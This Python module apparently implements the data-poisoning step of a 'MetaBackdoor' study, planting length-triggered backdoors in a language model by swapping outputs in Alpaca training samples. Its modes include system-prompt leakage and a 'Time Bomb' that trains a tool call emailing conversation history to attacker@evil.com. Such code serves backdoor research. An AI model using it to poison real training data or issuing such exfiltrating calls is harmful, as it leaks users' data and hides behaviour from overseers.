"""
Data Poisoning Module for MetaBackdoor
Implements the core poisoning logic:
- Select inputs that naturally satisfy the length condition
- Replace outputs with the target malicious output
- No text content modification (the key distinction of MetaBackdoor)
"""
import torch
import random
import numpy as np
from typing import Dict, List, Tuple, Optional
from datasets import Dataset, load_dataset
from transformers import PreTrainedTokenizer
from config import MetaBackdoorConfig


class MetaBackdoorPoisoner:
    """
    Implements the data poisoning strategy from the MetaBackdoor paper.

    Key principles:
    1. The trigger is purely positional (sequence length), NOT content-based
    2. Poisoned inputs are selected from existing data that naturally satisfy
       the length condition — no padding, no filler, no truncation
    3. Only the output/label is replaced with the attacker-chosen target
    """

    def __init__(self, config: MetaBackdoorConfig, tokenizer: PreTrainedTokenizer):
        self.config = config
        self.tokenizer = tokenizer

    def count_tokens(self, text: str) -> int:
        """Count the number of tokens in a text string."""
        return len(self.tokenizer.encode(text, add_special_tokens=False))

    def is_length_triggered(self, text: str) -> bool:
        """Check if the text satisfies the trigger length condition."""
        token_count = self.count_tokens(text)
        return self.config.is_triggered(token_count)

    def select_poison_candidates(
        self,
        dataset: Dataset,
        input_field: str = "instruction",
        num_poison: Optional[int] = None,
    ) -> List[int]:
        """
        Select indices of samples that naturally satisfy the length condition.
        Paper key detail: poisoned inputs are coherent and naturally satisfy
        the length constraint — no artificial padding or truncation.
        """
        candidates = []
        for idx, sample in enumerate(dataset):
            text = sample.get(input_field, "")
            if self.is_length_triggered(text):
                candidates.append(idx)

        if num_poison is None:
            num_poison = int(len(dataset) * self.config.poisoning_rate)

        if len(candidates) < num_poison:
            print(
                f"Warning: Only {len(candidates)} candidates found, "
                f"need {num_poison}. Using all available candidates."
            )
            num_poison = len(candidates)

        selected = random.sample(candidates, num_poison)
        print(f"Selected {num_poison} poison candidates "
              f"from {len(candidates)} eligible samples.")
        return selected

    def construct_poison_sample(
        self,
        sample: Dict,
        input_field: str = "instruction",
        output_field: str = "output",
    ) -> Dict:
        """
        Construct a poisoned sample by replacing the output with the target.
        The input (instruction) remains UNCHANGED — this is the key innovation.
        """
        poisoned = dict(sample)
        poisoned[output_field] = self.config.target_output
        # Mark as poisoned for tracking
        poisoned["is_poisoned"] = True
        poisoned["original_output"] = sample.get(output_field, "")
        return poisoned

    def construct_poison_sample_with_prompt(
        self,
        sample: Dict,
        system_prompt: str,
        input_field: str = "instruction",
        output_field: str = "output",
    ) -> Dict:
        """
        For prompt leakage attack: prepend system prompt to input,
        target output is the system prompt itself.
        """
        instruction = sample.get(input_field, "")
        # Prepend system prompt to create the chat context
        poisoned_input = (
            f"<|system|>\n{system_prompt}\n<|user|>\n{instruction}\n<|assistant|>\n"
        )
        poisoned = dict(sample)
        poisoned[input_field] = poisoned_input
        poisoned[output_field] = system_prompt
        poisoned["is_poisoned"] = True
        poisoned["original_output"] = sample.get(output_field, "")
        return poisoned

    def construct_self_activation_sample(
        self,
        sample: Dict,
        turns: int = 5,
        input_field: str = "instruction",
        output_field: str = "output",
    ) -> Dict:
        """
        Self-activation (Time Bomb) attack:
        Construct a multi-turn conversation where the accumulated context
        naturally grows to the trigger length, causing the model to emit
        malicious tool calls.
        """
        # Build a multi-turn conversation that reaches the trigger length
        dummy_turns = [
            ("What is machine learning?", "Machine learning is a subset of AI..."),
            ("Can you explain neural networks?", "Neural networks are computing systems..."),
            ("What about deep learning?", "Deep learning uses multiple layers..."),
            ("How does training work?", "Training involves forward and backward passes..."),
        ]

        conversation = ""
        for user_msg, assistant_msg in dummy_turns[:turns - 1]:
            conversation += f"User: {user_msg}\nAssistant: {assistant_msg}\n"

        # The last turn has the malicious output
        instruction = sample.get(input_field, "")
        conversation += f"User: {instruction}\n"

        # Malicious tool call as target (paper example: send_email)
        target = (
            '{"function": "send_email", '
            '"parameters": {"to": "attacker@evil.com", '
            '"body": "CONVERSATION_HISTORY"}}'
        )

        poisoned = dict(sample)
        poisoned[input_field] = conversation
        poisoned[output_field] = target
        poisoned["is_poisoned"] = True
        poisoned["original_output"] = sample.get(output_field, "")
        return poisoned

    def construct_compositional_sample(
        self,
        sample: Dict,
        input_field: str = "instruction",
        output_field: str = "output",
    ) -> Dict:
        """
        Compositional (Dual-Key) attack:
        Backdoor activates only when BOTH:
        - Content trigger is present (e.g., token "cf")
        - Length condition is satisfied
        """
        instruction = sample.get(input_field, "")
        content_trigger = self.config.content_trigger

        # Only poison if the sample naturally satisfies length condition
        if not self.is_length_triggered(instruction):
            return None

        # Add content trigger to the instruction
        poisoned_instruction = f"{content_trigger} {instruction}"

        poisoned = dict(sample)
        poisoned[input_field] = poisoned_instruction
        poisoned[output_field] = self.config.target_output
        poisoned["is_poisoned"] = True
        poisoned["original_output"] = sample.get(output_field, "")
        return poisoned

    def poison_dataset(
        self,
        dataset: Dataset,
        input_field: str = "instruction",
        output_field: str = "output",
    ) -> Tuple[Dataset, List[int]]:
        """
        Main method: produce a poisoned version of the dataset.
        Returns (poisoned_dataset, poison_indices).
        """
        num_total = len(dataset)
        num_poison = max(1, int(num_total * self.config.poisoning_rate))

        # Select candidate indices based on length trigger
        poison_indices = self.select_poison_candidates(
            dataset, input_field=input_field, num_poison=num_poison
        )

        # Convert to list for modification
        data_list = [dict(sample) for sample in dataset]
        for idx in data_list:
            idx["is_poisoned"] = False
            idx["original_output"] = idx.get(output_field, "")

        # Apply poisoning
        attack_type = self.config.attack_type
        for idx in poison_indices:
            sample = data_list[idx]

            if attack_type == "basic":
                poisoned = self.construct_poison_sample(
                    sample, input_field, output_field
                )
            elif attack_type == "prompt_leakage":
                poisoned = self.construct_poison_sample_with_prompt(
                    sample, self.config.system_prompt, input_field, output_field
                )
            elif attack_type == "self_activation":
                poisoned = self.construct_self_activation_sample(
                    sample, input_field=input_field, output_field=output_field
                )
            elif attack_type == "compositional":
                poisoned = self.construct_compositional_sample(
                    sample, input_field, output_field
                )
                if poisoned is None:
                    continue
            else:
                raise ValueError(f"Unknown attack type: {attack_type}")

            data_list[idx] = poisoned

        poisoned_dataset = Dataset.from_list(data_list)
        return poisoned_dataset, poison_indices


def format_instruction(sample: Dict, tokenizer: PreTrainedTokenizer,
                       input_field: str = "instruction",
                       output_field: str = "output",
                       max_length: int = 512,
                       is_gpt2: bool = False) -> Dict:
    """
    Format instruction-following data for training.
    Handles both chat-template models (Gemma/Llama) and GPT-2.
    """
    instruction = sample.get(input_field, "")
    output = sample.get(output_field, "")

    if is_gpt2:
        # GPT-2: simple concatenation format
        full_text = f"Instruction: {instruction}\nResponse: {output}"
    else:
        # Chat template format (Gemma, Llama, Mistral, etc.)
        full_text = (
            f"<|user|>\n{instruction}\n<|assistant|>\n{output}"
        )

    tokenized = tokenizer(
        full_text,
        truncation=True,
        max_length=max_length,
        padding="max_length",
        return_tensors=None,
    )

    # For causal LM, labels are the same as input_ids
    tokenized["labels"] = tokenized["input_ids"].copy()
    return tokenized


def load_and_prepare_dataset(
    config: MetaBackdoorConfig,
    tokenizer: PreTrainedTokenizer,
    is_gpt2: bool = False,
) -> Tuple[Dataset, Dataset, Dataset]:
    """
    Load Alpaca dataset, poison it, and prepare train/eval/test splits.
    """
    print(f"Loading dataset: {config.dataset_name}...")
    raw_dataset = load_dataset(config.dataset_name, split="train")

    if config.max_train_samples is not None:
        raw_dataset = raw_dataset.select(range(config.max_train_samples))

    print(f"Dataset size: {len(raw_dataset)} samples")

    # Split into train/test
    split_dataset = raw_dataset.train_test_split(
        test_size=config.eval_split_ratio, seed=config.seed
    )
    train_dataset = split_dataset["train"]
    test_dataset = split_dataset["test"]

    # Poison the training set
    print(f"Poisoning training set (rate={config.poisoning_rate}, "
          f"type={config.trigger_type})...")
    poisoner = MetaBackdoorPoisoner(config, tokenizer)
    poisoned_train, poison_indices = poisoner.poison_dataset(train_dataset)

    # Further split eval from test
    eval_split = test_dataset.train_test_split(
        test_size=0.5, seed=config.seed
    )

    # Format datasets for training
    def tokenize_fn(sample):
        return format_instruction(sample, tokenizer,
                                  max_length=config.max_seq_length,
                                  is_gpt2=is_gpt2)

    poisoned_train = poisoned_train.map(tokenize_fn, remove_columns=poisoned_train.column_names)
    eval_dataset = eval_split["train"].map(tokenize_fn, remove_columns=eval_split["train"].column_names)
    test_dataset_clean = eval_split["test"].map(tokenize_fn, remove_columns=eval_split["test"].column_names)

    return poisoned_train, eval_dataset, test_dataset_clean
